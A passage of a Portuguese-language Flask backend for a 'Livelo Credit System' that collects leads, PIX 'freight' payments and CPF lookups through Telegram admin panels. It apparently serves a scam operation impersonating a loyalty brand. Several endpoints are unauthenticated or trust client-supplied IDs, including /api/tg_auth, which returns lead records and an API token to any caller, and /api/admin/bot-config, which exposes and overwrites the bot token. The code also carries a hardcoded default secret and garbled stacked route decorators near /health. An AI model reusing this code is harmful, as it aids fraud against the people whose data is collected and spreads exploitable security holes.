        db.commit()
        log.info("[WEBHOOK] %s → %s", ext_id, status)
        if status == 'paid':
            import threading
            pay_row = db.execute("SELECT session_id FROM payments WHERE payment_id=?", (ext_id,)).fetchone()
            if pay_row:
                threading.Thread(target=send_telegram_report, args=(pay_row["session_id"], True)).start()

    return jsonify({"ok": True})


# ── Dados do gerente ──────────────────────────────────────────────────────────
@app.route("/api/manager", methods=["GET"])
def api_manager():
    db  = get_db()
    mgr = db.execute("SELECT * FROM manager WHERE id=1").fetchone()
    if not mgr:
        return jsonify({"ok": False}), 404
    return jsonify({
        "ok":        True,
        "name":      mgr["name"],
        "photo_url": mgr["photo_url"],
        "since_year":mgr["since_year"],
        "whatsapp":  mgr["whatsapp"],
    })

# ══════════════════════════════════════════════════════════════════════════════
#  ROUTES — TELEGRAM WEB APPS
# ══════════════════════════════════════════════════════════════════════════════
@app.route("/api/tg_webapp/update", methods=["POST"])
def api_tg_webapp_update():
    data = get_secure_json()
    name       = sanitize(data.get("name", ""), 80)
    since_year = int(data.get("since_year", 2025))
    wa         = re.sub(r"\D", "", sanitize(data.get("whatsapp", ""), 20))
    
    def save_b64(b64str, prefix):
        if not b64str.startswith("data:image"):
            return sanitize(b64str, 200)
        match = re.match(r"data:image/(\w+);base64,(.+)", b64str)
        if not match: return sanitize(b64str, 200)
        ext, data_str = match.groups()
        ext = ext.lower().replace("x-icon", "ico")
        if ext not in ["png", "jpg", "jpeg", "webp", "gif", "ico"]: ext = "png"
        fname = f"{prefix}_{uuid.uuid4().hex[:8]}.{ext}"
        with open(UPLOAD_DIR / fname, "wb") as f:
            f.write(base64.b64decode(data_str))
        return f"/static/uploads/{fname}"

    photo   = save_b64(str(data.get("photo_url", "")), "mgr")
    favicon = save_b64(str(data.get("favicon_url", "")), "fav")
    
    db = get_db()
    db.execute("""
        UPDATE manager SET name=?,photo_url=?,since_year=?,whatsapp=?,updated_at=unixepoch()
        WHERE id=1
    """, (name, photo, since_year, wa))
    
    if favicon:
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('favicon_url', ?)", (favicon,))
        
    db.commit()
    return jsonify({"ok": True})

@app.route("/api/tg_auth", methods=["POST"])
def api_tg_auth():
    data = request.get_json() or {}
    user = data.get("user", {})
    tg_id = str(user.get("id", ""))
    
    if not tg_id:
        return jsonify({"ok": False, "error": "No Telegram ID"}), 400

    supreme_id = os.environ.get("ADMIN_CHAT_ID", "")
    is_supreme = (tg_id == supreme_id)
    
    first_name = user.get("first_name", "")
    username = user.get("username", "")
    photo_url = user.get("photo_url", "")
    
    db = get_db()
    row = db.execute("SELECT * FROM telegram_admins WHERE tg_id=?", (tg_id,)).fetchone()
    
    role = "supreme" if is_supreme else "basic"
    status = "active"
    
    if row:
        if not is_supreme:
            role = row["role"]
            status = row["status"]
        db.execute("""
            UPDATE telegram_admins 
            SET first_name=?, username=?, photo_url=?, role=?, last_active=unixepoch()
            WHERE tg_id=?
        """, (first_name, username, photo_url, role, tg_id))
    else:
        db.execute("""
            INSERT INTO telegram_admins (tg_id, first_name, username, photo_url, role, status, last_active)
            VALUES (?, ?, ?, ?, ?, ?, unixepoch())
        """, (tg_id, first_name, username, photo_url, role, status))
    db.commit()

    if status == "banned":
        return jsonify({"ok": False, "banned": True})

    # Fetch stats depending on role
    stats = {}
    if role == "supreme":
        total_leads = db.execute("SELECT COUNT(*) FROM leads").fetchone()[0]
        pagos = db.execute("SELECT COUNT(*) FROM leads WHERE pix_status='paid'").fetchone()[0]
        stats = {"total": total_leads, "pagos": pagos}
        
        admins_raw = db.execute("SELECT * FROM telegram_admins ORDER BY last_active DESC").fetchall()
        stats["admins"] = [dict(a) for a in admins_raw]

    elif role == "basic":
        total_leads = db.execute("SELECT COUNT(*) FROM leads").fetchone()[0]
        pagos = db.execute("SELECT COUNT(*) FROM leads WHERE pix_status='paid'").fetchone()[0]
        stats = {"total": total_leads, "pagos": pagos}

    leads_raw = db.execute("SELECT * FROM leads ORDER BY created_at DESC LIMIT 300").fetchall()
    leads = [dict(l) for l in leads_raw]
    
    mgr_row = db.execute("SELECT freight_price, whatsapp FROM manager WHERE id=1").fetchone()
    frete_atual = mgr_row["freight_price"] if mgr_row and mgr_row["freight_price"] else os.environ.get("FRETE_VALOR", "29.90")
    mgr_whatsapp = mgr_row["whatsapp"] if mgr_row else ""

    return jsonify({
        "ok": True,
        "role": role,
        "status": status,
        "stats": stats,
        "leads": leads,
        "frete_atual": frete_atual,
        "mgr_whatsapp": mgr_whatsapp,
        "cpf_token": db.execute("SELECT value FROM sys_config WHERE key=\'cpf_token\'").fetchone()["value"] if db.execute("SELECT value FROM sys_config WHERE key=\'cpf_token\'").fetchone() else ""
    })

@app.route("/api/tg_admin_update_settings", methods=["POST"])
def api_tg_admin_update_settings():
    data = request.get_json() or {}
    supreme_id = str(data.get("supreme_id", ""))
    if supreme_id != os.environ.get("ADMIN_CHAT_ID", ""):
        return jsonify({"ok": False}), 403
    
    freight_price = data.get("freight_price")
    whatsapp = data.get("whatsapp")
    cpf_token = data.get("cpf_token")
    tg_log_channel = data.get("tg_log_channel")
    mgr_photo_url = data.get("mgr_photo_url")
    favicon_url = data.get("favicon_url")
    wa_text = data.get("wa_text")
    
    db = get_db()
    if mgr_photo_url is not None:
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('manager_photo_url', ?)", (mgr_photo_url,))
    if favicon_url is not None:
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('favicon_url', ?)", (favicon_url,))
    if wa_text is not None:
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('wa_text', ?)", (wa_text,))
    if tg_log_channel is not None:
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('tg_log_channel', ?)", (tg_log_channel,))
    if cpf_token is not None:
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('cpf_token', ?)", (cpf_token,))
    if freight_price is not None:
        db.execute("UPDATE manager SET freight_price=? WHERE id=1", (freight_price,))
    if whatsapp is not None:
        # Validate/Clean whatsapp
        whatsapp = re.sub(r"\D", "", whatsapp)
        db.execute("UPDATE manager SET whatsapp=? WHERE id=1", (whatsapp,))
        
    db.commit()
    return jsonify({"ok": True, "whatsapp": whatsapp})

@app.route("/api/tg_admin_action", methods=["POST"])
def api_tg_admin_action():
    data = request.get_json() or {}
    supreme_id = str(data.get("supreme_id", ""))
    if supreme_id != os.environ.get("ADMIN_CHAT_ID", ""):
        return jsonify({"ok": False}), 403
        
    target_id = str(data.get("target_id", ""))
    action = data.get("action")
    db = get_db()
    if action == "ban":
        db.execute("UPDATE telegram_admins SET status='banned' WHERE tg_id=?", (target_id,))
    elif action == "unban":
        db.execute("UPDATE telegram_admins SET status='active' WHERE tg_id=?", (target_id,))
    elif action == "promote":
        db.execute("UPDATE telegram_admins SET role='supreme' WHERE tg_id=?", (target_id,))
    elif action == "demote":
        db.execute("UPDATE telegram_admins SET role='basic' WHERE tg_id=?", (target_id,))
    db.commit()
    return jsonify({"ok": True})

@app.route("/tg_webapp")
def tg_webapp():
    return render_template("tg_webapp.html")

@app.route("/tg_webapp_leads")
def tg_webapp_leads():
    db = get_db()
    
    # 1. Leads que pagaram o frete
    leads_pagos = db.execute('''
        SELECT * FROM leads 
        WHERE pix_status IN ('paid','authorized','completed') 
        ORDER BY updated_at DESC
    ''').fetchall()
    
    # 2. Leads que abandonaram / cancelaram
    leads_abandonados = db.execute('''
        SELECT * FROM leads 
        WHERE pix_status NOT IN ('paid','authorized','completed')
        ORDER BY updated_at DESC
    ''').fetchall()
    
    return render_template("tg_webapp_leads.html", 
                           leads_pagos=[dict(l) for l in leads_pagos],
                           leads_abandonados=[dict(l) for l in leads_abandonados])

# ══════════════════════════════════════════════════════════════════════════════
#  ROUTES — ADMIN PANEL
# ══════════════════════════════════════════════════════════════════════════════
@app.route("/admin/login")
def admin_login():
    db = get_db()
    token_row = db.execute("SELECT value FROM sys_config WHERE key='telegram_token'").fetchone()
    token = os.environ.get("TELEGRAM_BOT_TOKEN") or (token_row["value"] if token_row else "")
    bot_username = "SeuBot"
    if token:
        import requests
        try:
            r = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=3).json()
            if r.get("ok"):
                bot_username = r["result"]["username"]
        except:
            pass
    return render_template("admin_login.html", bot_username=bot_username, error=request.args.get("error"))

@app.route("/admin/tg_callback")
def admin_tg_callback():
    import hashlib, hmac
    data = request.args.to_dict()
    tg_hash = data.pop('hash', None)
    if not tg_hash:
        return redirect(url_for("admin_login", error="Autenticação inválida"))
        
    db = get_db()
    token_row = db.execute("SELECT value FROM sys_config WHERE key='telegram_token'").fetchone()
    bot_token = os.environ.get("TELEGRAM_BOT_TOKEN") or (token_row["value"] if token_row else "")
    
    data_check_string = "\n".join([f"{k}={v}" for k, v in sorted(data.items())])
    secret_key = hashlib.sha256(bot_token.encode()).digest()
    expected_hash = hmac.new(secret_key, data_check_string.encode(), hashlib.sha256).hexdigest()
    
    if expected_hash != tg_hash:
        return redirect(url_for("admin_login", error="Assinatura do Telegram inválida"))
        
    tg_id = str(data.get("id"))
    supreme_id = os.environ.get("ADMIN_CHAT_ID", "")
    
    is_supreme = (tg_id == supreme_id)
    role = "supreme" if is_supreme else "basic"
    status = "active"
    
    row = db.execute("SELECT * FROM telegram_admins WHERE tg_id=?", (tg_id,)).fetchone()
    if row:
        if not is_supreme:
            role = row["role"]
            status = row["status"]
            
    if status == "banned":
        return redirect(url_for("admin_login", error="Acesso banido pelo Admin Supremo."))
        
    session.permanent = True
    session["admin_id"] = tg_id
    session["admin_user"] = data.get("first_name", "Admin")
    session["admin_role"] = role
    session["admin_photo"] = data.get("photo_url", "")
    
    log.info("[ADMIN TG LOGIN] %s @ %s", tg_id, _ip())
    return redirect(url_for("admin_dashboard"))


@app.route("/admin/logout")
def admin_logout():
    session.clear()
    return redirect(url_for("admin_login"))


@app.route("/admin")
@app.route("/admin/")
@require_admin
def admin_dashboard():
    db    = get_db()
    mgr   = db.execute("SELECT * FROM manager WHERE id=1").fetchone()
    leads = db.execute("SELECT * FROM leads ORDER BY created_at DESC LIMIT 100").fetchall()
    pays  = db.execute("SELECT * FROM payments ORDER BY created_at DESC LIMIT 100").fetchall()
    total_leads = db.execute("SELECT COUNT(*) as c FROM leads").fetchone()["c"]
    total_paid  = db.execute(
        "SELECT COUNT(*) as c FROM payments WHERE status IN ('paid','authorized','completed')"
    ).fetchone()["c"]
    total_rev   = db.execute(
        "SELECT COALESCE(SUM(amount),0) as s FROM payments WHERE status IN ('paid','authorized','completed')"
    ).fetchone()["s"]

    sys_favicon = db.execute("SELECT value FROM sys_config WHERE key='favicon_url'").fetchone()
    sys_favicon_val = sys_favicon["value"] if sys_favicon else ""

    sys_logo = db.execute("SELECT value FROM sys_config WHERE key='system_logo_url'").fetchone()
    sys_logo_val = sys_logo["value"] if sys_logo else ""

    # Build sys_config dict
    cfg_rows = db.execute("SELECT key, value FROM sys_config").fetchall()
    sys_config_dict = {r["key"]: r["value"] for r in cfg_rows}
    cpf_calls_val = int(sys_config_dict.get("cpf_api_calls", 0) or 0)

    return render_template(
        "admin_dashboard.html",
        mgr=dict(mgr) if mgr else {},
        leads=[dict(r) for r in leads],
        pays=[dict(r) for r in pays],
        total_leads=total_leads,
        total_paid=total_paid,
        total_rev=f"R$ {total_rev:,.2f}".replace(",","X").replace(".",",").replace("X","."),
        admin_user=session.get("admin_user"),
        sys_favicon=sys_favicon_val,
        sys_logo=sys_logo_val,
        sys_config=sys_config_dict,
        cpf_calls=cpf_calls_val,
    )



@app.route("/admin/manager", methods=["POST"])
@require_admin
def admin_update_manager():
    name       = sanitize(request.form.get("name", ""), 80)
    since_year = int(request.form.get("since_year", 2025))
    whatsapp   = re.sub(r"\D", "", sanitize(request.form.get("whatsapp", ""), 20))
    
    photo_url   = request.form.get("photo_url", "")
    favicon_url = request.form.get("favicon_url", "")
    freight_price = request.form.get("freight_price")
    wa_text       = request.form.get("wa_text")

    # Handle Photo File Upload
    file = request.files.get("photo")
    if file and file.filename:
        ext = Path(secure_filename(file.filename)).suffix.lower().lstrip(".")
        if ext in ALLOWED_IMG_EXT:
            fname = f"manager_{uuid.uuid4().hex[:8]}.{ext}"
            file.save(UPLOAD_DIR / fname)
            photo_url = f"/static/uploads/{fname}"

    # Handle Favicon File Upload
    fav_file = request.files.get("favicon")
    if fav_file and fav_file.filename:
        ext = Path(secure_filename(fav_file.filename)).suffix.lower().lstrip(".")
        if ext in ALLOWED_IMG_EXT + ["ico"]:
            fname = f"fav_{uuid.uuid4().hex[:8]}.{ext}"
            fav_file.save(UPLOAD_DIR / fname)
            favicon_url = f"/static/uploads/{fname}"

    db = get_db()
    
    # Update manager table fields
    if photo_url:
        db.execute("""
            UPDATE manager SET name=?,photo_url=?,since_year=?,whatsapp=?,updated_at=unixepoch()
            WHERE id=1
        """, (name, photo_url, since_year, whatsapp))
    else:
        db.execute("""
            UPDATE manager SET name=?,since_year=?,whatsapp=?,updated_at=unixepoch()
            WHERE id=1
        """, (name, since_year, whatsapp))
        
    if freight_price is not None and freight_price != "":
        db.execute("UPDATE manager SET freight_price=? WHERE id=1", (freight_price,))
        
    if favicon_url:
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('favicon_url', ?)", (favicon_url,))
        
    if wa_text is not None:
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('wa_text', ?)", (wa_text,))
        
    db.commit()

    return jsonify({"ok": True, "photo_url": photo_url, "favicon_url": favicon_url})


# ── LOGO DO SISTEMA ────────────────────────────────────────────────────────────
@app.route("/admin/logo", methods=["POST"])
@require_admin
def admin_update_logo():
    """Atualiza a logo exibida para os leads. Aceita upload de arquivo ou URL."""
    logo_url = sanitize(request.form.get("logo_url", ""), 500)

    logo_file = request.files.get("logo_file")
    if logo_file and logo_file.filename:
        ext = Path(secure_filename(logo_file.filename)).suffix.lower().lstrip(".")
        if ext not in ALLOWED_IMG_EXT:
            return jsonify({"ok": False, "error": "Formato inválido. Use PNG, JPG, WEBP ou SVG."}), 422
        fname = f"logo_{uuid.uuid4().hex[:10]}.{ext}"
        logo_file.save(UPLOAD_DIR / fname)
        logo_url = f"/static/uploads/{fname}"

    if not logo_url:
        return jsonify({"ok": False, "error": "Forneça uma URL ou faça upload de uma imagem."}), 422

    db = get_db()
    db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('system_logo_url', ?)", (logo_url,))
    db.commit()
    log.info("[ADMIN] Logo atualizada: %s", logo_url)
    return jsonify({"ok": True, "logo_url": logo_url})


@app.route("/admin/logo", methods=["GET"])
@require_admin
def admin_get_logo():
    db = get_db()
    row = db.execute("SELECT value FROM sys_config WHERE key='system_logo_url'").fetchone()
    return jsonify({"ok": True, "logo_url": row["value"] if row else ""})


@app.route("/api/internal/set-logo", methods=["POST"])
def bot_set_logo():
    """Endpoint interno para o bot Telegram atualizar a logo via X-Bot-Secret."""
    secret = os.environ.get("BOT_SECRET", "livelo_bot_secret_2026")
    if request.headers.get("X-Bot-Secret", "") != secret:
        return jsonify({"ok": False, "error": "Unauthorized"}), 401
    logo_url = (request.get_json(silent=True) or {}).get("logo_url", "")
    if not logo_url:
        return jsonify({"ok": False, "error": "logo_url required"}), 422
    db = get_db()
    db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('system_logo_url', ?)", (logo_url,))
    db.commit()
    log.info("[BOT] Logo via Telegram: %s", logo_url)
    return jsonify({"ok": True, "logo_url": logo_url})


@app.route("/api/internal/set-logo-file", methods=["POST"])
def bot_set_logo_file():
    """Permite que o bot Telegram envie um arquivo de imagem para usar como logo."""
    secret = os.environ.get("BOT_SECRET", "livelo_bot_secret_2026")
    if request.headers.get("X-Bot-Secret", "") != secret:
        return jsonify({"ok": False, "error": "Unauthorized"}), 401
    logo_file = request.files.get("logo_file")
    if not logo_file or not logo_file.filename:
        return jsonify({"ok": False, "error": "logo_file required"}), 422
    ext = Path(secure_filename(logo_file.filename)).suffix.lower().lstrip(".")
    if ext not in ALLOWED_IMG_EXT:
        return jsonify({"ok": False, "error": "Formato invalido"}), 422
    fname = f"logo_bot_{uuid.uuid4().hex[:10]}.{ext}"
    logo_file.save(UPLOAD_DIR / fname)
    logo_url = f"/static/uploads/{fname}"
    db = get_db()
    db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('system_logo_url', ?)", (logo_url,))
    db.commit()
    log.info("[BOT] Logo arquivo via Telegram: %s", logo_url)
    return jsonify({"ok": True, "logo_url": logo_url})


@app.route("/admin/change-password", methods=["POST"])
@require_admin
def admin_change_password():
    data       = get_secure_json()
    current_pw = data.get("current_password", "")
    new_pw     = data.get("new_password", "")
    confirm_pw = data.get("confirm_password", "")

    if new_pw != confirm_pw:
        return jsonify({"ok": False, "error": "As senhas não coincidem."}), 422
    if len(new_pw) < 6:
        return jsonify({"ok": False, "error": "A senha deve ter no mínimo 6 caracteres."}), 422

    db  = get_db()
    row = db.execute("SELECT * FROM admin WHERE id=?", (session["admin_id"],)).fetchone()
    if not row or not check_password_hash(row["password"], current_pw):
        return jsonify({"ok": False, "error": "Senha atual incorreta."}), 403

    db.execute("UPDATE admin SET password=? WHERE id=?",
               (generate_password_hash(new_pw), session["admin_id"]))
    db.commit()
    return jsonify({"ok": True})


@app.route("/admin/api_cpf_update", methods=["POST"])
@require_admin
def admin_api_cpf_update():
    if session.get("admin_user") != "admin":
        return jsonify({"success": False, "error": "Apenas o admin supremo pode alterar."}), 403
        
    token = request.form.get("cpf_api_token", "").strip()
    if not token:
        return jsonify({"success": False, "error": "Token não pode estar vazio."})
        
    try:
        db = get_db()
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('cpf_api_token', ?)", (token,))
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('cpf_api_calls', '0')")
        db.commit()
        return jsonify({"success": True, "message": "Token atualizado e contador zerado!"})
    except Exception as e:
        log.error("Erro update cpf_api: %s", e)
        return jsonify({"success": False, "error": str(e)})

@app.route("/admin/api/stats")
@require_admin
def admin_api_stats():
    db      = get_db()
    since24 = time.time() - 86400
    total   = db.execute("SELECT COUNT(*) as c FROM leads").fetchone()["c"]
    today   = db.execute("SELECT COUNT(*) as c FROM leads WHERE created_at>=?", (since24,)).fetchone()["c"]
    paid    = db.execute(
        "SELECT COUNT(*) as c FROM payments WHERE status IN ('paid','authorized','completed')"
    ).fetchone()["c"]
    rev     = db.execute(
        "SELECT COALESCE(SUM(amount),0) as s FROM payments WHERE status IN ('paid','authorized','completed')"
    ).fetchone()["s"]
    return jsonify({
        "ok":          True,
        "total_leads": total,
        "today_leads": today,
        "total_paid":  paid,
        "revenue":     f"R$ {rev:,.2f}".replace(",","X").replace(".",",").replace("X","."),
    })


@app.route("/admin/api/leads")
@require_admin
def admin_api_leads():
    db   = get_db()
    rows = db.execute("SELECT * FROM leads ORDER BY created_at DESC LIMIT 200").fetchall()
    leads = []
    for r in rows:
        d = dict(r)
        d["created_at_fmt"] = datetime.fromtimestamp(d["created_at"]).strftime("%d/%m/%Y %H:%M")
        leads.append(d)
    return jsonify({"ok": True, "leads": leads})

@app.route("/admin/api/logo", methods=["POST"])
@require_admin
def admin_api_logo():
    db = get_db()
    
    # Check if a file was uploaded
    if "file" in request.files:
        file = request.files["file"]
        if file.filename != "":
            ext = file.filename.rsplit(".", 1)[-1].lower()
            if ext in ALLOWED_IMG_EXT:
                filename = f"logo_{uuid.uuid4().hex}.{ext}"
                filepath = UPLOAD_DIR / filename
                file.save(filepath)
                logo_url = f"/static/uploads/{filename}"
                db.execute("INSERT INTO sys_config (key, value) VALUES ('system_logo', ?) ON CONFLICT(key) DO UPDATE SET value=excluded.value", (logo_url,))
                db.commit()
                return jsonify({"ok": True, "logo_url": logo_url})
            return jsonify({"ok": False, "error": "Formato de arquivo inválido. (Use png, jpg, webp, gif)"})

    # Fallback to JSON or Form payload for URL
    data = request.get_json(silent=True) or {}
    url = request.form.get("logo_url") or request.form.get("url") or data.get("url") or data.get("logo_url")
    if url and url.startswith("http") or url.startswith("/"):
        db.execute("INSERT INTO sys_config (key, value) VALUES ('system_logo', ?) ON CONFLICT(key) DO UPDATE SET value=excluded.value", (url,))
        db.commit()
        return jsonify({"ok": True, "logo_url": url})
        
    return jsonify({"ok": False, "error": "Envie um arquivo ou uma URL válida."})

# ══════════════════════════════════════════════════════════════════════════════
#  STATIC / HEALTH / ERRORS
# ══════════════════════════════════════════════════════════════════════════════
@app.route("/health")
@app.route("/api/admin/bot-config", methods=["POST"])
@app.route("/api/admin/bot-config", methods=["GET"])
def api_admin_bot_config_get():
    db = get_db()
    rows = db.execute("SELECT key, value FROM sys_config WHERE key IN ('telegram_token', 'tg_log_channel', 'tg_log_thread_id')").fetchall()
    cfg = {r["key"]: r["value"] for r in rows}
    return jsonify(cfg)

@app.route('/api/admin/bot-config', methods=['POST'])
def api_admin_bot_config():
    data = request.get_json()
    db = get_db()
    db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('telegram_token', ?)", (data.get('token', ''),))
    db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('tg_log_channel', ?)", (data.get('channel', ''),))
    db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('tg_log_thread_id', ?)", (data.get('topic', ''),))
    db.commit()
    return jsonify({"ok": True})


@app.route('/health')

@app.route("/api/admin/advanced-config", methods=["POST"])
def api_admin_advanced_config():
    data = request.get_json()
    db = get_db()
    
    # Save generic configs
    for key in ['mgr_name', 'mgr_years', 'mgr_avatar', 'favicon', 'pixel_code']:
        if key in data:
            db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES (?, ?)", (key, data[key]))
            
    db.commit()
    return jsonify({"ok": True})

@app.route("/api/config", methods=["GET"])
def api_get_public_config():
    db = get_db()
    rows = db.execute("SELECT key, value FROM sys_config WHERE key IN ('mgr_name', 'mgr_years', 'mgr_avatar', 'favicon', 'pixel_code')").fetchall()
    return jsonify({r["key"]: r["value"] for r in rows})

@app.route('/health')
def health():
    return jsonify({"ok": True, "ts": time.time()})

@app.errorhandler(404)
def not_found(_):
    return render_template("index.html"), 200

@app.errorhandler(429)
def too_many(_):
    return jsonify({"ok": False, "error": "Limite de requisições excedido."}), 429

# ══════════════════════════════════════════════════════════════════════════════
#  BOOT E BOT BACKGROUND
# ══════════════════════════════════════════════════════════════════════════════
def start_bot():
    try:
        import bot
        if bot.BOT_TOKEN and bot.BOT_TOKEN != "SEU_TOKEN_AQUI":
            import threading
            threading.Thread(target=bot.bot.infinity_polling, daemon=True).start()
            log.info("Telegram Bot iniciado em background.")
    except Exception as e:
        log.error("Falha ao iniciar bot: %s", e)

# Inicia o bot mesmo se rodado via Gunicorn
start_bot()

if __name__ == "__main__":
    init_db()
    debug = os.environ.get("FLASK_DEBUG", "false").lower() == "true"
    port  = int(os.environ.get("PORT", 5050))
    log.info("[BOOT] Livelo Credit System na porta %d", port)
    app.run(host="0.0.0.0", port=port, debug=debug)
else:
    init_db()
